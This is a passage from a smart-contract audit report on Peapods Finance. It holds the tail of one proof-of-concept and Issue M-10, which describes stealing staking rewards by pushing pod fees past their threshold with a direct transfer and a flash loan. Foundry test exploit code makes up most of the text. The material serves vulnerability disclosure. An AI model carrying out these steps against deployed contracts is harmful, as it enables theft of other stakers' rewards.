        _pod1Peas.bond(address(_peas), 100_000 ether, 1 ether);
        _pod1Peas.addLiquidityV2(100_000 ether, 100_000 ether, 100, block.timestamp);
    }

    function _deployAutoCompoundingPodLpFactory() internal {
        _aspTKNFactory = new AutoCompoundingPodLpFactory();
    }
    
    function _getAutoCompoundingPodLpAddresses() internal {
        _aspTKN1PeasAddress = _aspTKNFactory.getNewCaFromParams(
            "Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0
        );
    }

    function _deployAspTKNOracles() internal {
        _v2Res = new V2ReservesUniswap();
        _clOracle = new ChainlinkSinglePriceOracle(address(0));
        _uniOracle = new UniswapV3SinglePriceOracle(address(0));
        _diaOracle = new DIAOracleV2SinglePriceOracle(address(0));

        _aspTKNMinOracle1Peas = new aspTKNMinimalOracle(
            address(_aspTKN1PeasAddress),
            abi.encode(
                address(_clOracle),
                address(_uniOracle),
                address(_diaOracle),
                address(_mockDai),
                false,
                false,
                _pod1Peas.lpStakingPool(),
                address(_v3peasDaiPool)
            ),
            abi.encode(address(0), address(0), address(0), address(0), address(0), address(_v2Res))
        );
    }

    function _deployAspTKNs() internal {
        //POD 1
        address _lpPeas = _pod1Peas.lpStakingPool();
        address _stakingPeas = StakingPoolToken(_lpPeas).stakingToken();

        IERC20(_stakingPeas).approve(_lpPeas, 500e18);
        StakingPoolToken(_lpPeas).stake(address(this), 500e18);
        IERC20(_lpPeas).approve(address(_aspTKNFactory), 500e18);

        _aspTKNFactory.create("Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0);
        _aspTKN1Peas = AutoCompoundingPodLp(_aspTKN1PeasAddress);

        IERC20(_lpPeas).approve(address(_aspTKN1Peas), 400e18);
        _aspTKN1Peas.deposit(400e18, address(this));
    }

    function _deployVariableInterestRate() internal {
        _variableInterestRate = new VariableInterestRate(
            "[0.5 0.2@.875 5-10k] 2 days (.75-.85)",
            87500,
            200000000000000000,
            75000,
            85000,
            158247046,
            1582470460,
            3164940920000,
            172800
        );
    }

    function _deployFraxWhitelist() internal {
        _fraxWhitelist = new FraxlendWhitelist();
    }

    function _deployFraxPairRegistry() internal {
        address[] memory _initialDeployers = new address[](0);
        _fraxRegistry = new FraxlendPairRegistry(address(this), _initialDeployers);
    }

    function _deployFraxPairDeployer() internal {
        ConstructorParams memory _params =
            ConstructorParams(circuitBreaker, comptroller, timelock, address(_fraxWhitelist), address(_fraxRegistry));
        _fraxDeployer = new FraxlendPairDeployer(_params);

        _fraxDeployer.setCreationCode(type(FraxlendPair).creationCode);

        address[] memory _whitelistDeployer = new address[](1);
        _whitelistDeployer[0] = address(this);

        _fraxWhitelist.setFraxlendDeployerWhitelist(_whitelistDeployer, true);

        address[] memory _registryDeployer = new address[](1);
        _registryDeployer[0] = address(_fraxDeployer);

        _fraxRegistry.setDeployers(_registryDeployer, true);
    }

    function _deployFraxPairs() internal {
        vm.warp(block.timestamp + 1 days);

        _fraxLPToken1Peas = FraxlendPair(
            _fraxDeployer.deploy(
                abi.encode(
                    _pod1Peas.PAIRED_LP_TOKEN(), // asset
                    _aspTKN1PeasAddress, // collateral
                    address(_aspTKNMinOracle1Peas), //oracle
                    5000, // maxOracleDeviation
                    address(_variableInterestRate), //rateContract
                    1000, //fullUtilizationRate
                    75000, // maxLtv
                    10000, // uint256 _cleanLiquidationFee
                    9000, // uint256 _dirtyLiquidationFee
                    2000 //uint256 _protocolLiquidationFee
                )
            )
        );
    }

    function _deployLendingAssetVault() internal {
        _lendingAssetVault = new LendingAssetVault("Test LAV", "tLAV", address(_mockDai));
        IERC20 vaultAsset1Peas = IERC20(_fraxLPToken1Peas.asset());
        vaultAsset1Peas.approve(address(_fraxLPToken1Peas), vaultAsset1Peas.totalSupply());
        vaultAsset1Peas.approve(address(_lendingAssetVault), vaultAsset1Peas.totalSupply());
        _lendingAssetVault.setVaultWhitelist(address(_fraxLPToken1Peas), true);

        address[] memory _vaults = new address[](1);
        _vaults[0] = address(_fraxLPToken1Peas);
        uint256[] memory _allocations = new uint256[](1);
        _allocations[0] = 100_000e18;
        _lendingAssetVault.setVaultMaxAllocation(_vaults, _allocations);

        vm.prank(timelock);
        _fraxLPToken1Peas.setExternalAssetVault(IERC4626Extended(address(_lendingAssetVault)));
    }

    function _deployLeverageManager() internal {
        _leverageManager = new LeverageManager("Test LM", "tLM", IIndexUtils(address(_indexUtils)));
        _leverageManager.setLendingPair(address(_pod1Peas), address(_fraxLPToken1Peas));
    }

    function _deployFlashSources() internal {
        _uniswapV3FlashSourcePeas = new UniswapV3FlashSource(address(_v3peasDaiFlash), address(_leverageManager));
        _leverageManager.setFlashSource(address(_pod1Peas.PAIRED_LP_TOKEN()), address(_uniswapV3FlashSourcePeas));
    }

    function testPoc() public { //leave as paired lp is set to true in the setup
        UniswapV2Pair _v2Pool = UniswapV2Pair(_pod1Peas.DEX_HANDLER().getV2Pool(address(_pod1Peas), address(_mockDai)));
        StakingPoolToken _spTKN = StakingPoolToken(_pod1Peas.lpStakingPool());
        TokenRewards _tokenRewards = TokenRewards(_spTKN.POOL_REWARDS());
        _aspTKN1Peas.setPodOracle(_aspTKNMinOracle1Peas);

        vm.startPrank(bob);
        console.log("\n====== Bob bonds 20_000e18 Peas ======");
        _peas.approve(address(_pod1Peas), 20_000e18);
        _pod1Peas.bond(address(_peas), 20_000e18, 0);

        vm.warp(block.timestamp + 1000);

        console.log("\n====== Bob adds liquidity 10_000e18 ======");
        _mockDai.approve(address(_pod1Peas), 10_000e18);
        _pod1Peas.addLiquidityV2(10_000e18, 10_000e18, 1000, block.timestamp);
        
        console.log("\n====== Bob stakes 9500e18 lp tokens ======");
        _v2Pool.approve(_pod1Peas.lpStakingPool(), 9500e18);
        _spTKN.stake(bob, 9500e18); //The steps up to this point were simply there so that Bob has spTKNs to steal rewards with.

        console.log("\n====== Bob claims rewards for AutoCompoundingLp ======");
        console.log("_aspTKN1Peas _mockDai balance before: ", _mockDai.balanceOf(address(_aspTKN1Peas)));
        //There are rewards for AutoCompoundingPodLp. (In this example, the rewards all come from the fees that Bob paid when bonding, 
        //but if this bug were exploited in reality, there would be many more users generating rewards.)
        _tokenRewards.claimReward(address(_aspTKN1Peas));
        console.log("_aspTKN1Peas _mockDai balance after: ", _mockDai.balanceOf(address(_aspTKN1Peas))); //Shows that the rewards are now in AutoCompoundingPodLp and are waiting to be compounded

        vm.warp(block.timestamp + 1000);

        console.log("Bob spTKN balance before: ", _spTKN.balanceOf(bob)); //Can later be used to calculate how many more tokens the attacker has than at the beginning
        _mockDai.approve(address(_v2SwapRouter), 5000e18);
        address[] memory path = new address[](2);
        path[0] = address(_mockDai);
        path[1] = address(_pod1Peas);
        //Bob swaps _mockDai into _pod1Peas so that the slippage in _processRewardsToPodLp is too high and cannot be compounded
        _v2SwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            5000e18,
            0,
            path,
            bob,
            block.timestamp
        );

        console.log("\n====== Bob deposits 9500 spTkns ======");
        _spTKN.approve(address(_aspTKN1Peas), 9500e18);
        _aspTKN1Peas.deposit(9500e18, bob);
        console.log("_aspTKN1Peas _mockDai balance: ", _mockDai.balanceOf(address(_aspTKN1Peas))); //Shows that the rewards were not compounded

        _pod1Peas.approve(address(_v2SwapRouter), 6300e18);
        path[0] = address(_pod1Peas);
        path[1] = address(_mockDai);
        //Bob swaps the tokens back to ensure that the swap works during the next compound
        _v2SwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            6300e18,
            0,
            path,
            bob,
            block.timestamp
        );

        console.log("\n====== Bob redeems 9500 aspTkns ======");
        //Bob redeems his tokens again, with the compounding working this time, resulting in more spTKNs in the AutoCompoundingPodLp, of which he then receives a portion. 
        //This portion should actually be for users who had already deposited before rewards were available.
        _aspTKN1Peas.redeem(9_500e18, bob, bob);
        vm.stopPrank();
        console.log("Bob spTKN balance after: ", _spTKN.balanceOf(bob)); //Shows that Bob has more SPKNs after the attack

        //Shows that too few spTKNs in _aspTKN1Peas are there, the rewards that Bob received should actually belong to the user who already deposited in the 
        //setup in _deployAspTKNs in line 400
        console.log("_aspTKN1Peas _spTKN balance: ", _spTKN.balanceOf(address(_aspTKN1Peas)));
    }
}
```
3. The POC can then be started with `forge test --mt testPoc -vv --fork-url <FORK_URL>`

# Issue M-10: The attacker can steal rewards from spTKNs because they can influence the fee processing by making a direct token transfer to the pod when the fees are below the minimum 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/286 

## Found by 
Schnilch, X77, pkqs90

### Summary

Fees in a pod are only swapped to rewards once a minimum threshold is exceeded. This allows an attacker to stake in a transaction while no fees are processed as rewards because they are still below the minimum. Then, they can send a few pTKNs as fees to the pod to push the balance above the minimum and subsequently unstake to receive a portion of the rewards. Since all of this is possible in a single transaction, the attacker can also use a flash loan to steal more rewards. Important with a flash loan is that the attacker cannot use `flashMint`, because during this process, the staking of spTKNs is reverted. This means they have to take a flash loan of the underlying token of the pool and then bond it.

### Root Cause

In `_processPreSwapFeesAndSwap` in DecentralizedIndex, fees are swapped to rewards once the fees exceed a minimum threshold:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/DecentralizedIndex.sol#L193-L211
These rewards are then sent to TokenRewards and will be distributed to spTKN stakers. An attacker can exploit that `_bal` can be manipulated through a direct token transfer. An attacker could, if `_bal` is just below the minimum, stake, then push the fees to the minimum, and then unstake to make rewards in a single transaction.

### Internal Pre-conditions

1. The balance must be just below the minimum so that it is profitable for the attacker to supply the remaining pTKNs as fees

### External Pre-conditions

1. It should be enough tokens in the Uniswap pool so that the minimum is not too low and the attacker can make a profit

### Attack Path

1. It is assumed that fees are below the minimum in the pod
2. An attacker sees this and takes a flash loan, then bonds it
3. The attacker adds the received pTKNs as liquidity and receives LP tokens
4. He then stakes these LP tokens in spTKN. Here, the rewards cannot be processed because they are just below the minimum
6. The attacker sends a few pTKNs into the pod so that the balance is above the minimum
7. He unstakes the spTKNs again, where the fees can be processed this time, and the attacker receives a portion of the rewards
8. Then he removes the liquidity, debonds, and repays the flash loan

### Impact

An attacker can steal rewards through a flash loan, and the users receive too little of the rewards.

### PoC

1. To execute the POC, a `POC.t.sol` file should be created in `contracts/test/POC.t.sol`.
2. The following code should be inserted into the file:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

// forge
import {Test} from "forge-std/Test.sol";

// PEAS
import {PEAS} from "../../contracts/PEAS.sol";
import {V3TwapUtilities} from "../../contracts/twaputils/V3TwapUtilities.sol";
import {UniswapDexAdapter} from "../../contracts/dex/UniswapDexAdapter.sol";
import {IDecentralizedIndex} from "../../contracts/interfaces/IDecentralizedIndex.sol";
import {WeightedIndex} from "../../contracts/WeightedIndex.sol";
import {StakingPoolToken} from "../../contracts/StakingPoolToken.sol";
import {LendingAssetVault} from "../../contracts/LendingAssetVault.sol";
import {IndexUtils} from "../../contracts/IndexUtils.sol";
import {IIndexUtils} from "../../contracts/interfaces/IIndexUtils.sol";
import {IndexUtils} from "../contracts/IndexUtils.sol";
import {RewardsWhitelist} from "../../contracts/RewardsWhitelist.sol";
import {TokenRewards} from "../../contracts/TokenRewards.sol";

// oracles
import {ChainlinkSinglePriceOracle} from "../../contracts/oracle/ChainlinkSinglePriceOracle.sol";
import {UniswapV3SinglePriceOracle} from "../../contracts/oracle/UniswapV3SinglePriceOracle.sol";
import {DIAOracleV2SinglePriceOracle} from "../../contracts/oracle/DIAOracleV2SinglePriceOracle.sol";
import {V2ReservesUniswap} from "../../contracts/oracle/V2ReservesUniswap.sol";
import {aspTKNMinimalOracle} from "../../contracts/oracle/aspTKNMinimalOracle.sol";

// protocol fees
import {ProtocolFees} from "../../contracts/ProtocolFees.sol";
import {ProtocolFeeRouter} from "../../contracts/ProtocolFeeRouter.sol";

// autocompounding
import {AutoCompoundingPodLpFactory} from "../../contracts/AutoCompoundingPodLpFactory.sol";
import {AutoCompoundingPodLp} from "../../contracts/AutoCompoundingPodLp.sol";

// lvf
import {LeverageManager} from "../../contracts/lvf/LeverageManager.sol";

// fraxlend
import {FraxlendPairDeployer, ConstructorParams} from "./invariant/modules/fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "./invariant/modules/fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "./invariant/modules/fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "./invariant/modules/fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "./invariant/modules/fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "./invariant/modules/fraxlend/interfaces/IERC4626Extended.sol";

// flash
import {IVault} from "./invariant/modules/balancer/interfaces/IVault.sol";
import {BalancerFlashSource} from "../../contracts/flash/BalancerFlashSource.sol";
import {PodFlashSource} from "../../contracts/flash/PodFlashSource.sol";
import {UniswapV3FlashSource} from "../../contracts/flash/UniswapV3FlashSource.sol";

// uniswap-v2-core
import {UniswapV2Factory} from "v2-core/UniswapV2Factory.sol";
import {UniswapV2Pair} from "v2-core/UniswapV2Pair.sol";

// uniswap-v2-periphery
import {UniswapV2Router02} from "v2-periphery/UniswapV2Router02.sol";

// uniswap-v3-core
import {UniswapV3Factory} from "v3-core/UniswapV3Factory.sol";
import {UniswapV3Pool} from "v3-core/UniswapV3Pool.sol";

// uniswap-v3-periphery
import {SwapRouter02} from "swap-router/SwapRouter02.sol";
import {LiquidityManagement} from "v3-periphery/base/LiquidityManagement.sol";
import {PeripheryPayments} from "v3-periphery/base/PeripheryPayments.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";

// mocks
import {WETH9} from "./invariant/mocks/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./invariant/mocks/MockERC20.sol";
import {TestERC20} from "./invariant/mocks/TestERC20.sol";
import {TestERC4626Vault} from "./invariant/mocks/TestERC4626Vault.sol";
import {MockV3Aggregator} from "./invariant/mocks/MockV3Aggregator.sol";
import {MockUniV3Minter} from "./invariant/mocks/MockUniV3Minter.sol";
import {MockV3TwapUtilities} from "./invariant/mocks/MockV3TwapUtilities.sol";

import {PodHelperTest} from "./helpers/PodHelper.t.sol";

contract AuditTests is PodHelperTest {
    address alice = vm.addr(uint256(keccak256("alice")));
    address bob = vm.addr(uint256(keccak256("bob")));
    address charlie = vm.addr(uint256(keccak256("charlie")));

    uint256[] internal _fraxPercentages = [10000, 2500, 7500, 5000];

    // fraxlend protocol actors
    address internal comptroller = vm.addr(uint256(keccak256("comptroller")));
    address internal circuitBreaker = vm.addr(uint256(keccak256("circuitBreaker")));
    address internal timelock = vm.addr(uint256(keccak256("comptroller")));

    uint16 internal fee = 100;
    uint256 internal PRECISION = 10 ** 27;

    uint256 donatedAmount;
    uint256 lavDeposits;

    /*///////////////////////////////////////////////////////////////
                            TEST CONTRACTS
    ///////////////////////////////////////////////////////////////*/

    PEAS internal _peas;
    MockV3TwapUtilities internal _twapUtils;
    UniswapDexAdapter internal _dexAdapter;
    LendingAssetVault internal _lendingAssetVault;
    LendingAssetVault internal _lendingAssetVault2;
    RewardsWhitelist internal _rewardsWhitelist;

    // oracles
    V2ReservesUniswap internal _v2Res;
    ChainlinkSinglePriceOracle internal _clOracle;
    UniswapV3SinglePriceOracle internal _uniOracle;
    DIAOracleV2SinglePriceOracle internal _diaOracle;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Peas;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Weth;

    // protocol fees
    ProtocolFees internal _protocolFees;
    ProtocolFeeRouter internal _protocolFeeRouter;

    // pods
    WeightedIndex internal _pod1Peas;

    // index utils
    IndexUtils internal _indexUtils;

    // autocompounding
    AutoCompoundingPodLpFactory internal _aspTKNFactory;
    AutoCompoundingPodLp internal _aspTKN1Peas;
    address internal _aspTKN1PeasAddress;

    // lvf
    LeverageManager internal _leverageManager;

    // fraxlend
    FraxlendPairDeployer internal _fraxDeployer;
    FraxlendWhitelist internal _fraxWhitelist;
    FraxlendPairRegistry internal _fraxRegistry;
    VariableInterestRate internal _variableInterestRate;

    FraxlendPair internal _fraxLPToken1Peas;

    // flash
    UniswapV3FlashSource internal _uniswapV3FlashSourcePeas;

    // mocks
    MockUniV3Minter internal _uniV3Minter;
    MockERC20 internal _mockDai;
    WETH9 internal _weth;
    MockERC20 internal _tokenA;
    MockERC20 internal _tokenB;
    MockERC20 internal _tokenC;

    // uniswap-v2-core
    UniswapV2Factory internal _uniV2Factory;
    UniswapV2Pair internal _uniV2Pool;

    // uniswap-v2-periphery
    UniswapV2Router02 internal _v2SwapRouter;

    // uniswap-v3-core
    UniswapV3Factory internal _uniV3Factory;
    UniswapV3Pool internal _v3peasDaiPool;
    UniswapV3Pool internal _v3peasDaiFlash;

    // uniswap-v3-periphery
    SwapRouter02 internal _v3SwapRouter;

    function setUp() public override {
        super.setUp();

        _deployUniV3Minter();
        _deployWETH();
        _deployTokens();
        _deployPEAS();
        _deployUniV2();
        _deployUniV3();
        _deployProtocolFees();
        _deployRewardsWhitelist();
        _deployTwapUtils();
        _deployDexAdapter();
        _deployIndexUtils();
        _deployWeightedIndexes();
        _deployAutoCompoundingPodLpFactory();
        _getAutoCompoundingPodLpAddresses();
        _deployAspTKNOracles();
        _deployAspTKNs();
        _deployVariableInterestRate();
        _deployFraxWhitelist();
        _deployFraxPairRegistry();
        _deployFraxPairDeployer();
        _deployFraxPairs();
        _deployLendingAssetVault();
        _deployLeverageManager();
        _deployFlashSources();
        
        _mockDai.mint(alice, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
        _peas.transfer(alice, 100_000 ether);
        _peas.transfer(bob, 100_000 ether);
        _peas.transfer(charlie, 100_000 ether);
    }

    function _deployUniV3Minter() internal {
        _uniV3Minter = new MockUniV3Minter();
    }

    function _deployWETH() internal {
        _weth = new WETH9();

        vm.deal(address(this), 1_000_000 ether);
        _weth.deposit{value: 1_000_000 ether}();

        vm.deal(address(_uniV3Minter), 2_000_000 ether);
        vm.prank(address(_uniV3Minter));
        _weth.deposit{value: 2_000_000 ether}();
    }

    function _deployTokens() internal {
        _mockDai = new MockERC20();
        _tokenA = new MockERC20();
        _tokenB = new MockERC20();
        _tokenC = new MockERC20();

        _mockDai.initialize("MockDAI", "mDAI", 18);
        _tokenA.initialize("TokenA", "TA", 18);
        _tokenB.initialize("TokenB", "TB", 18);
        _tokenC.initialize("TokenC", "TC", 18);

        _tokenA.mint(address(this), 1_000_000 ether);
        _tokenB.mint(address(this), 1_000_000 ether);
        _tokenC.mint(address(this), 1_000_000 ether);
        _mockDai.mint(address(this), 1_000_000 ether);

        _tokenA.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenB.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenC.mint(address(_uniV3Minter), 1_000_000 ether);
        _mockDai.mint(address(_uniV3Minter), 1_000_000 ether);

        _tokenA.mint(alice, 1_000_000 ether);
        _tokenB.mint(alice, 1_000_000 ether);
        _tokenC.mint(alice, 1_000_000 ether);
        _mockDai.mint(alice, 1_000_000 ether);

        _tokenA.mint(bob, 1_000_000 ether);
        _tokenB.mint(bob, 1_000_000 ether);
        _tokenC.mint(bob, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);

        _tokenA.mint(charlie, 1_000_000 ether);
        _tokenB.mint(charlie, 1_000_000 ether);
        _tokenC.mint(charlie, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
    }

    function _deployPEAS() internal {
        _peas = new PEAS("Peapods", "PEAS");
        _peas.transfer(address(_uniV3Minter), 2_000_000 ether);
    }

    function _deployUniV2() internal {
        _uniV2Factory = new UniswapV2Factory(address(this));
        _v2SwapRouter = new UniswapV2Router02(address(_uniV2Factory), address(_weth));
    }

    function _deployUniV3() internal {
        _uniV3Factory = new UniswapV3Factory();
        _v3peasDaiPool = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 10_000));
        _v3peasDaiPool.initialize(1 << 96);
        _v3peasDaiPool.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiPool, 100_000 ether);

        _v3peasDaiFlash = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 500));
        _v3peasDaiFlash.initialize(1 << 96);
        _v3peasDaiFlash.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiFlash, 100_000e18);

        _v3SwapRouter = new SwapRouter02(address(_uniV2Factory), address(_uniV3Factory), address(0), address(_weth));
    }

    function _deployProtocolFees() internal {
        _protocolFees = new ProtocolFees();
        _protocolFees.setYieldAdmin(500);
        _protocolFees.setYieldBurn(500);

        _protocolFeeRouter = new ProtocolFeeRouter(_protocolFees);
        bytes memory code = address(_protocolFeeRouter).code;
        vm.etch(0x7d544DD34ABbE24C8832db27820Ff53C151e949b, code);
        _protocolFeeRouter = ProtocolFeeRouter(0x7d544DD34ABbE24C8832db27820Ff53C151e949b);

        vm.prank(_protocolFeeRouter.owner());
        _protocolFeeRouter.transferOwnership(address(this));
        _protocolFeeRouter.setProtocolFees(_protocolFees);
    }

    function _deployRewardsWhitelist() internal {
        _rewardsWhitelist = new RewardsWhitelist();
        bytes memory code = address(_rewardsWhitelist).code;
        vm.etch(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F, code);
        _rewardsWhitelist = RewardsWhitelist(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F);

        vm.prank(_rewardsWhitelist.owner());
        _rewardsWhitelist.transferOwnership(address(this));
        _rewardsWhitelist.toggleRewardsToken(address(_peas), true);
    }

    function _deployTwapUtils() internal {
        _twapUtils = new MockV3TwapUtilities();
        bytes memory code = address(_twapUtils).code;
        vm.etch(0x024ff47D552cB222b265D68C7aeB26E586D5229D, code);
        _twapUtils = MockV3TwapUtilities(0x024ff47D552cB222b265D68C7aeB26E586D5229D);
    }

    function _deployDexAdapter() internal {
        _dexAdapter = new UniswapDexAdapter(_twapUtils, address(_v2SwapRouter), address(_v3SwapRouter), false);
    }

    function _deployIndexUtils() internal {
        _indexUtils = new IndexUtils(_twapUtils, _dexAdapter);
    }

    function _deployWeightedIndexes() internal {
        IDecentralizedIndex.Config memory _c;
        IDecentralizedIndex.Fees memory _f;
        _f.bond = 300;
        _f.debond = 300;
        _f.burn = 500;
        _f.buy = 200;

        // POD1 (Peas)
        address[] memory _t1 = new address[](1);
        _t1[0] = address(_peas);
        uint256[] memory _w1 = new uint256[](1);
        _w1[0] = 100;
        address __pod1Peas = _createPod(
            "Peas Pod",
            "pPeas",
            _c,
            _f,
            _t1,
            _w1,
            address(0),
            false,
            abi.encode(
                address(_mockDai),
                address(_peas),
                address(_mockDai),
                address(_protocolFeeRouter),
                address(_rewardsWhitelist),
                address(_twapUtils),
                address(_dexAdapter)
            )
        );
        _pod1Peas = WeightedIndex(payable(__pod1Peas));

        _peas.approve(address(_pod1Peas), 100_000 ether);
        _mockDai.approve(address(_pod1Peas), 100_000 ether);
        _pod1Peas.bond(address(_peas), 100_000 ether, 1 ether);
        _pod1Peas.addLiquidityV2(100_000 ether, 100_000 ether, 100, block.timestamp);
    }

    function _deployAutoCompoundingPodLpFactory() internal {
        _aspTKNFactory = new AutoCompoundingPodLpFactory();
    }
    
    function _getAutoCompoundingPodLpAddresses() internal {
        _aspTKN1PeasAddress = _aspTKNFactory.getNewCaFromParams(
            "Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0
        );
    }

    function _deployAspTKNOracles() internal {
        _v2Res = new V2ReservesUniswap();
        _clOracle = new ChainlinkSinglePriceOracle(address(0));
        _uniOracle = new UniswapV3SinglePriceOracle(address(0));
        _diaOracle = new DIAOracleV2SinglePriceOracle(address(0));

        _aspTKNMinOracle1Peas = new aspTKNMinimalOracle(
            address(_aspTKN1PeasAddress),
            abi.encode(
                address(_clOracle),
                address(_uniOracle),
                address(_diaOracle),
                address(_mockDai),
                false,
                false,
                _pod1Peas.lpStakingPool(),
                address(_v3peasDaiPool)
            ),
            abi.encode(address(0), address(0), address(0), address(0), address(0), address(_v2Res))
        );
    }

    function _deployAspTKNs() internal {
        //POD 1
        address _lpPeas = _pod1Peas.lpStakingPool();
        address _stakingPeas = StakingPoolToken(_lpPeas).stakingToken();

        IERC20(_stakingPeas).approve(_lpPeas, 1000);
        StakingPoolToken(_lpPeas).stake(address(this), 1000);
        IERC20(_lpPeas).approve(address(_aspTKNFactory), 1000);

        _aspTKNFactory.create("Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0);
        _aspTKN1Peas = AutoCompoundingPodLp(_aspTKN1PeasAddress);
    }

    function _deployVariableInterestRate() internal {
        _variableInterestRate = new VariableInterestRate(
            "[0.5 0.2@.875 5-10k] 2 days (.75-.85)",
            87500,
            200000000000000000,
            75000,
            85000,
            158247046,
            1582470460,
            3164940920000,
            172800
        );
    }

    function _deployFraxWhitelist() internal {
        _fraxWhitelist = new FraxlendWhitelist();
    }

    function _deployFraxPairRegistry() internal {
        address[] memory _initialDeployers = new address[](0);
        _fraxRegistry = new FraxlendPairRegistry(address(this), _initialDeployers);
    }

    function _deployFraxPairDeployer() internal {
        ConstructorParams memory _params =
            ConstructorParams(circuitBreaker, comptroller, timelock, address(_fraxWhitelist), address(_fraxRegistry));
        _fraxDeployer = new FraxlendPairDeployer(_params);

        _fraxDeployer.setCreationCode(type(FraxlendPair).creationCode);

        address[] memory _whitelistDeployer = new address[](1);
        _whitelistDeployer[0] = address(this);

        _fraxWhitelist.setFraxlendDeployerWhitelist(_whitelistDeployer, true);

        address[] memory _registryDeployer = new address[](1);
        _registryDeployer[0] = address(_fraxDeployer);

        _fraxRegistry.setDeployers(_registryDeployer, true);
    }

    function _deployFraxPairs() internal {
        vm.warp(block.timestamp + 1 days);

        _fraxLPToken1Peas = FraxlendPair(
            _fraxDeployer.deploy(
                abi.encode(
                    _pod1Peas.PAIRED_LP_TOKEN(), // asset
                    _aspTKN1PeasAddress, // collateral
                    address(_aspTKNMinOracle1Peas), //oracle
                    5000, // maxOracleDeviation
                    address(_variableInterestRate), //rateContract
                    1000, //fullUtilizationRate
                    75000, // maxLtv
                    10000, // uint256 _cleanLiquidationFee
                    9000, // uint256 _dirtyLiquidationFee
                    2000 //uint256 _protocolLiquidationFee
                )
            )
        );
    }

    function _deployLendingAssetVault() internal {
        _lendingAssetVault = new LendingAssetVault("Test LAV", "tLAV", address(_mockDai));
        IERC20 vaultAsset1Peas = IERC20(_fraxLPToken1Peas.asset());
        vaultAsset1Peas.approve(address(_fraxLPToken1Peas), vaultAsset1Peas.totalSupply());
        vaultAsset1Peas.approve(address(_lendingAssetVault), vaultAsset1Peas.totalSupply());
        _lendingAssetVault.setVaultWhitelist(address(_fraxLPToken1Peas), true);

        address[] memory _vaults = new address[](1);
        _vaults[0] = address(_fraxLPToken1Peas);
        uint256[] memory _allocations = new uint256[](1);
        _allocations[0] = 100_000e18;
        _lendingAssetVault.setVaultMaxAllocation(_vaults, _allocations);

        vm.prank(timelock);
        _fraxLPToken1Peas.setExternalAssetVault(IERC4626Extended(address(_lendingAssetVault)));
    }

    function _deployLeverageManager() internal {
        _leverageManager = new LeverageManager("Test LM", "tLM", IIndexUtils(address(_indexUtils)));
        _leverageManager.setLendingPair(address(_pod1Peas), address(_fraxLPToken1Peas));
    }

    function _deployFlashSources() internal {
        _uniswapV3FlashSourcePeas = new UniswapV3FlashSource(address(_v3peasDaiFlash), address(_leverageManager));
        _leverageManager.setFlashSource(address(_pod1Peas.PAIRED_LP_TOKEN()), address(_uniswapV3FlashSourcePeas));
    }

    function testPoc5() public {
        UniswapV2Pair _v2Pool = UniswapV2Pair(_pod1Peas.DEX_HANDLER().getV2Pool(address(_pod1Peas), address(_mockDai)));
        StakingPoolToken _spTKN = StakingPoolToken(_pod1Peas.lpStakingPool());
        TokenRewards _tokenRewards = TokenRewards(_spTKN.POOL_REWARDS());

        vm.startPrank(alice);
        console.log("\n====== Alice bonds 100 PEAS ======");
        _peas.approve(address(_pod1Peas), 100e18);
        _pod1Peas.bond(address(_peas), 100e18, 0);

        console.log("\n====== Alice adds 90 liquidity ======");
        _mockDai.approve(address(_pod1Peas), 90e18);
        _pod1Peas.addLiquidityV2(
            90e18,
            90e18,
            1000,
            block.timestamp
        ); //Alice is the attacker, so she needs a few LP tokens that she can stake later
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days);

        vm.startPrank(bob);
        console.log("\n====== Bob bonds 3300 PEAS ======");
        _peas.approve(address(_pod1Peas), 3300e18);
        _pod1Peas.bond(address(_peas), 3300e18, 0); //Bob bonds so that a few fees are generated, which stay in the pod and are later swapped as rewards
        vm.stopPrank();
        console.log("min: ", _pod1Peas.balanceOf(address(_v2Pool)) / 1000);
        console.log("balance _pod1Peas: ", _pod1Peas.balanceOf(address(_pod1Peas))); //Here you can see that the fees cannot yet be swapped to rewards because the collected fees have not yet reached the minimum required

        vm.startPrank(alice);
        console.log("\n====== Alice stakes 90 lp ======");
        _v2Pool.approve(address(_spTKN), 90e18);
        _spTKN.stake(alice, 90e18); //Since there are still too few fees in the contract, they cannot be processed

        console.log("\n====== Alice fills rewards in order to distribute them ======");
        _pod1Peas.transfer(address(_pod1Peas), 4e18); //Alice sends a few pTKNs as fees to reach the minimum

        console.log("\n====== Alice unstakes 90e18 spTKNs ======");
        console.log("alice peas balance before: ", _peas.balanceOf(alice));
